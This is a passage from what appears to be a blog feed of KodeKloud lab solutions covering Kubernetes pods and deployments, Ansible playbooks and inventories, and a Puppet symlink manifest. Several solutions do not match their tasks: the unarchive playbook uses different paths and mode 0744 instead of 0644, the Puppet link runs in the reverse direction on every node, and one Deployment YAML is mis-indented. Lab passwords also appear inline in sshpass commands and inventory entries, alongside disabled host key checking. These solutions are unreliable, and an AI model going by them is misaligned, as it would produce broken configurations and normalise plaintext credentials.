<li>The shared volume shared-files should be mounted at /var/www/html location in both containers. Copy /opt/index.php from jump host to the nginx document root inside nginx container, once done you can access the app using App button on the top bar.</li>
</ul>
</li>
<li>Before clicking on finish button always make sure to check if all pods are in running state.</li>
<li>You can use any labels as per your choice.
=&gt; Note: The kubectl utility on jump_host has been configured to work with the kubernetes cluster.</li>
</ul>
<h6 id="solution-2">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Service</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx-phpfpm</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">type</span>: <span style="color:#ae81ff">NodePort</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">app</span>: <span style="color:#ae81ff">nginx-phpfpm</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">tier</span>: <span style="color:#ae81ff">back-end</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">port</span>: <span style="color:#ae81ff">8096</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">targetPort</span>: <span style="color:#ae81ff">8096</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">nodePort</span>: <span style="color:#ae81ff">30012</span> 
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">ConfigMap</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx-config</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">data</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">nginx.conf</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    events {} 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    http {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      server {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        listen 8096;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        index index.html index.htm index.php;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        root  /var/www/html;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        location ~ \.php$ {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          include fastcgi_params;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          fastcgi_param REQUEST_METHOD $request_method;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          fastcgi_pass 127.0.0.1:9000;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    } </span>    
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx-phpfpm</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">labels</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">app</span>: <span style="color:#ae81ff">nginx-phpfpm</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">tier</span>: <span style="color:#ae81ff">back-end</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">shared-files</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">emptyDir</span>: {}
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx-config-volume</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">configMap</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx-config</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx-container</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">image</span>: <span style="color:#ae81ff">nginx:latest</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">volumeMounts</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">shared-files</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/var/www/html</span>
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx-config-volume</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/etc/nginx/nginx.conf</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">subPath</span>: <span style="color:#ae81ff">nginx.conf</span>
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">php-fpm-container</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">image</span>: <span style="color:#ae81ff">php:7.0-fpm</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">volumeMounts</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">shared-files</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/var/www/html</span>
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>thor@jump_host ~$ kubectl apply -f .
</span></span><span style="display:flex;"><span>thor@jump_host ~$ kubectl get all
</span></span><span style="display:flex;"><span>NAME               READY   STATUS    RESTARTS   AGE
</span></span><span style="display:flex;"><span>pod/nginx-phpfpm   2/2     Running   <span style="color:#ae81ff">0</span>          5m
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NAME                   TYPE        CLUSTER-IP   EXTERNAL-IP   PORT<span style="color:#f92672">(</span>S<span style="color:#f92672">)</span>          AGE
</span></span><span style="display:flex;"><span>service/kubernetes     ClusterIP   10.96.0.1    &lt;none&gt;        443/TCP          76m
</span></span><span style="display:flex;"><span>service/nginx-phpfpm   NodePort    10.96.72.3   &lt;none&gt;        8096:30012/TCP   5m
</span></span><span style="display:flex;"><span>thor@jump_host ~$ kubectl cp /opt/index.php nginx-phpfpm:/var/www/html/ --container<span style="color:#f92672">=</span>nginx-container
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="deploy-node-app-on-kubernetes">Deploy Node App on Kubernetes</h2>
<ul>
<li>The Nautilus development team has completed development of one of the node applications, which they are planning to deploy on a Kubernetes cluster. They recently had a meeting with the DevOps team to share their requirements. Based on that, the DevOps team has listed out the exact requirements to deploy the app. Find below more details:</li>
<li>Create a deployment using gcr.io/kodekloud/centos-ssh-enabled:node image, replica count must be 2.</li>
<li>Create a service to expose this app, the service type must be NodePort, targetPort must be 8080 and nodePort should be 30012.</li>
<li>Make sure all the pods are in Running state after the deployment.</li>
<li>You can check the application by clicking on NodeApp button on top bar.</li>
<li>You can use any labels as per your choice.
=&gt; Note: The kubectl on jump_host has been configured to work with the kubernetes cluster</li>
</ul>
<h6 id="solution-3">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">apps/v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Deployment</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">node-deployment</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">default</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">replicas</span>: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">matchLabels</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">app</span>: <span style="color:#ae81ff">node-app</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">template</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">labels</span>: 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">app</span>: <span style="color:#ae81ff">node-app</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">node-container</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">image</span>: <span style="color:#ae81ff">gcr.io/kodekloud/centos-ssh-enabled:node</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">containerPort</span>: <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Service</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">node-service</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">default</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">type</span>: <span style="color:#ae81ff">NodePort</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">app</span>: <span style="color:#ae81ff">node-app</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">port</span>: <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">targetPort</span>: <span style="color:#ae81ff">8080</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">nodePort</span>: <span style="color:#ae81ff">30012</span>
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>thor@jump_host ~$ kubectl get pods
</span></span><span style="display:flex;"><span>NAME                              READY   STATUS    RESTARTS   AGE
</span></span><span style="display:flex;"><span>node-deployment-dd99d7b78-ftr2r   1/1     Running   <span style="color:#ae81ff">0</span>          2m2s
</span></span><span style="display:flex;"><span>node-deployment-dd99d7b78-wshn6   1/1     Running   <span style="color:#ae81ff">0</span>          2m2s
</span></span><span style="display:flex;"><span>thor@jump_host ~$ kubectl get svc
</span></span><span style="display:flex;"><span>NAME           TYPE        CLUSTER-IP      EXTERNAL-IP   PORT<span style="color:#f92672">(</span>S<span style="color:#f92672">)</span>        AGE
</span></span><span style="display:flex;"><span>kubernetes     ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP        30m
</span></span><span style="display:flex;"><span>node-service   NodePort    10.96.174.163   &lt;none&gt;        80:30012/TCP   3m
</span></span></code></pre></div></li>
</ul>
<hr>
]]></content></item><item><title>KodeKloud Engineer Ansible Challenges</title><link>https://chxmxii.github.io/portfolio/posts/2023/08/kodekloud-engineer-ansible-challenges/</link><pubDate>Tue, 01 Aug 2023 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2023/08/kodekloud-engineer-ansible-challenges/</guid><description>Ansible Unarchive Module One of the DevOps team members has created an ZIP archive on jump host in Stratos DC that needs to be extracted and copied over to all app servers in Stratos DC itself. Because this is a routine task, the Nautilus DevOps team has suggested automating it. We can use Ansible since we have been using it for other automation tasks. Below you can find more details about the task: We have an inventory file under /home/thor/ansible directory on jump host, which should have all the app servers added already.</description><content type="html"><![CDATA[<h2 id="ansible-unarchive-module">Ansible Unarchive Module</h2>
<ul>
<li>One of the DevOps team members has created an ZIP archive on jump host in Stratos DC that needs to be extracted and copied over to all app servers in Stratos DC itself. Because this is a routine task, the Nautilus DevOps team has suggested automating it. We can use Ansible since we have been using it for other automation tasks. Below you can find more details about the task:</li>
<li>We have an inventory file under /home/thor/ansible directory on jump host, which should have all the app servers added already.</li>
<li>There is a ZIP archive /usr/src/devops/nautilus.zip on jump host.</li>
<li>Create a playbook.yml under /home/thor/ansible/ directory on jump host itself to perform the below given tasks.</li>
<li>Unzip /usr/src/devops/nautilus.zip archive in /opt/devops/ location on all app servers.</li>
<li>Make sure the extracted data must has the respective sudo user as their user and group owner, i.e tony for app server 1, steve for app server 2, banner for app server 3.</li>
<li>The extracted data permissions must be 0644</li>
<li>Note: Validation will try to run the playbook using command ansible-playbook -i inventory playbook.yml so please make sure playbook works this way, without passing any extra arguments.</li>
</ul>
<h6 id="solution">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#verify the connectivity </span>
</span></span><span style="display:flex;"><span>ansible all -m ping -i inventory
</span></span><span style="display:flex;"><span><span style="color:#75715e">#create a playbook.yml</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#run the playbook</span>
</span></span><span style="display:flex;"><span>ansible-playbook -i inventory playbook.yml
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>- <span style="color:#f92672">hosts</span>: <span style="color:#ae81ff">all</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">tasks</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">unarchive</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">src</span>: <span style="color:#ae81ff">/usr/src/sysops/xfusion.zip</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">dest</span>: <span style="color:#ae81ff">/opt/sysops/</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">mode</span>: <span style="color:#e6db74">&#39;0744&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">owner</span>: <span style="color:#ae81ff">tony</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">group</span>: <span style="color:#ae81ff">tony</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">when</span>: <span style="color:#ae81ff">ansible_hostname == &#34;stapp01&#34;</span>
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">unarchive</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">src</span>: <span style="color:#ae81ff">/usr/src/sysops/xfusion.zip</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">dest</span>: <span style="color:#ae81ff">/opt/sysops/</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">mode</span>: <span style="color:#e6db74">&#39;0744&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">owner</span>: <span style="color:#ae81ff">steve</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">group</span>: <span style="color:#ae81ff">steve</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">when</span>: <span style="color:#ae81ff">ansible_hostname == &#34;stapp02&#34;</span>
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">unarchive</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">src</span>: <span style="color:#ae81ff">/usr/src/sysops/xfusion.zip</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">dest</span>: <span style="color:#ae81ff">/opt/sysops/</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">mode</span>: <span style="color:#e6db74">&#39;0744&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">owner</span>: <span style="color:#ae81ff">banner</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">group</span>: <span style="color:#ae81ff">banner</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">when</span>: <span style="color:#ae81ff">ansible_hostname == &#34;stapp03&#34;</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="ansible-facts-gathering">Ansible Facts Gathering</h2>
<ul>
<li>The Nautilus DevOps team is trying to setup a simple Apache web server on all app servers in Stratos DC using Ansible. They also want to create a sample html page for now with some app specific data on it. Below you can find more details about the task.</li>
<li>You will find a valid inventory file /home/thor/playbooks/inventory on jump host (which we are using as an Ansible controller).</li>
<li>Create a playbook index.yml under /home/thor/playbooks directory on jump host. Using blockinfile Ansible module create a file facts.txt under /root directory on all app servers and add the following given block in it. You will need to enable facts gathering for this task.
Ansible managed node IP is <!-- raw HTML omitted -->
(You can obtain default ipv4 address from Ansible&rsquo;s gathered facts by using the correct Ansible variable while taking into account Jinja2 syntax)</li>
<li>Install httpd server on all apps. After that make a copy of facts.txt file as index.html under /var/www/html directory. Make sure to start httpd service after that.
Note: Do not create a separate role for this task, just add all of the changes in index.yml playbook.</li>
</ul>
<h6 id="solution-1">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>- <span style="color:#f92672">hosts</span>: <span style="color:#ae81ff">all</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">gather_facts</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">tasks</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">file</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/root/facts.txt</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">state</span>: <span style="color:#ae81ff">touch</span>
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">blockinfile</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">dest</span>: <span style="color:#ae81ff">/root/facts.txt</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">block</span>: <span style="color:#e6db74">&#34;Ansible managed node IP is {{ansible_default_ipv4[&#39;address&#39;]}}&#34;</span>
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">package</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">httpd</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">state</span>: <span style="color:#ae81ff">installed</span>
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">copy</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">remote_src</span>: <span style="color:#66d9ef">yes</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">src</span>: <span style="color:#ae81ff">/root/facts.txt</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">dest</span>: <span style="color:#ae81ff">/var/www/html/index.html</span>
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">service</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">httpd</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">state</span>: <span style="color:#ae81ff">started  </span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="puppet-create-symlinks">Puppet Create Symlinks</h2>
<ul>
<li>Some directory structure in the Stratos Datacenter needs to be changed, there is a directory that needs to be linked to the default Apache document root. We need to accomplish this task using Puppet, as per the instructions given below:</li>
<li>Create a puppet programming file official.pp under /etc/puppetlabs/code/environments/production/manifests directory on puppet master node i.e on Jump Server. Within that define a class symlink and perform below mentioned tasks:</li>
<li>Create a symbolic link through puppet programming code. The source path should be /opt/itadmin and destination path should be /var/www/html on Puppet agents 2 i.e on App Servers 2.
Create a blank file media.txt under /opt/itadmin directory on puppet agent 2 nodes i.e on App Servers 2.</li>
<li>Notes:
<ul>
<li>Please make sure to run the puppet agent test using sudo on agent nodes, otherwise you can face certificate issues. In that case you will have to clean the certificates first and then you will be able to run the puppet agent test.</li>
<li>Before clicking on the Check button please make sure to verify puppet server and puppet agent services are up and running on the respective servers, also please make sure to run puppet agent test to apply/test the changes manually first.</li>
</ul>
</li>
<li>P lease note that once lab is loaded, the puppet server service should start automatically on puppet master server, however it can take upto 2-3 minutes to start.</li>
</ul>
<h6 id="solution-2">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo vi /etc/puppetlabs/code/environments/production/manifests/official.pp
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify the syntax</span>
</span></span><span style="display:flex;"><span>puppet parser validate /etc/puppetlabs/code/environments/production/manifests/official.pp
</span></span><span style="display:flex;"><span><span style="color:#75715e">#run on the agent 2</span>
</span></span><span style="display:flex;"><span>sshpass -p Am3ric@ ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no steve@stapp02
</span></span><span style="display:flex;"><span>sudo puppet agent -tv
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>ls -lrt /var/www/html
</span></span><span style="display:flex;"><span>ls -lrt /opt/itadmin
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">symlink</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//create sym link
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">file</span>{<span style="color:#e6db74">&#39;/opt/itadmin&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ensure</span> =&gt; <span style="color:#e6db74">&#39;link&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">target</span> =&gt; <span style="color:#e6db74">&#39;/var/www/html&#39;</span>,
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//create file media.txt
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">file</span>{<span style="color:#e6db74">&#39;/opt/itadmin/media.txt&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ensure</span> =&gt; <span style="color:#e6db74">&#39;present&#39;</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">node</span> <span style="color:#e6db74">&#39;stapp01.stratos.xfusioncorp.com&#39;</span>, <span style="color:#e6db74">&#39;stapp02.stratos.xfusioncorp.com&#39;</span>, <span style="color:#e6db74">&#39;stapp03.stratos.xfusioncorp.com&#39;</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">include</span> <span style="color:#a6e22e">symlink</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="ansible-basic-playbook">Ansible Basic Playbook</h2>
<ul>
<li>One of the Nautilus DevOps team members was working on to test an Ansible playbook on jump host. However, he was only able to create the inventory, and due to other priorities that came in he has to work on other tasks. Please pick up this task from where he left off and complete it. Below are more details about the task:</li>
<li>The inventory file /home/thor/ansible/inventory seems to be having some issues, please fix them. The playbook needs to be run on App Server 2 in Stratos DC, so inventory file needs to be updated accordingly.</li>
<li>Create a playbook /home/thor/ansible/playbook.yml and add a task to create an empty file /tmp/file.txt on App Server 2.</li>
<li>Note: Validation will try to run the playbook using command ansible-playbook -i inventory playbook.yml so please mak</li>
</ul>
<h6 id="solution-3">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#fix the inventory file by adding the ssh user and sshpass</span>
</span></span><span style="display:flex;"><span>stapp02 ansible_host<span style="color:#f92672">=</span>172.16.238.11 ansible_ssh_user<span style="color:#f92672">=</span>steve ansible_ssh_pass<span style="color:#f92672">=</span>Am3ric@ <span style="color:#75715e">#remote_user=steve</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>ansible stapp02 -m ping -i ansible/inventory
</span></span><span style="display:flex;"><span><span style="color:#75715e">#now lets write the playbook</span>
</span></span><span style="display:flex;"><span>vi ansible/playboo.yml
</span></span><span style="display:flex;"><span><span style="color:#75715e">#run the playbook</span>
</span></span><span style="display:flex;"><span>ansible-playbook playbook.yml -i inventory
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>- <span style="color:#f92672">hosts</span>: <span style="color:#ae81ff">stapp02</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">tasks</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">file</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">dest</span>: <span style="color:#ae81ff">/tmp/file.txt</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">state</span>: <span style="color:#ae81ff">touch</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="ansible-inventory-update">Ansible Inventory Update</h2>
<ul>
<li>The Nautilus DevOps team has started testing their Ansible playbooks on different servers within the stack. They have placed some playbooks under /home/thor/playbook/ directory on jump host which they want to test. Some of these playbooks have already been tested on different servers, but now they want to test them on app server 1 in Stratos DC. However, they first need to create an inventory file so that Ansible can connect to the respective app. Below are some requirements:</li>
<li>a. Create an ini type Ansible inventory file /home/thor/playbook/inventory on jump host.</li>
<li>b. Add App Server 1 in this inventory along with required variables that are needed to make it work.</li>
<li>c. The inventory hostname of the host should be the server name as per the wiki, for example stapp01 for app server 1 in Stratos DC.</li>
<li>Note: Validation will try to run the playbook using command ansible-playbook -i inventory playbook.yml so please make sure the playbook works this way without passing any extra arguments.</li>
</ul>
<h6 id="solution-4">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>cd playbooks
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;stapp01 ansible_user=tony ansible_password=Ir0nM@n&#34;</span> &gt; inventory
</span></span><span style="display:flex;"><span>ansible-playbook -i inventory playbook.yml
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="ansible-config-file-update">Ansible Config File Update</h2>
<ul>
<li>To manage all servers within the stack using Ansible, the Nautilus DevOps team is planning to use a common sudo user among all servers. Ansible will be able to use this to perform different tasks on each server. This is not finalized yet, but the team has decided to first perform testing. The DevOps team has already installed Ansible on jump host using yum, and they now have the following requirement:</li>
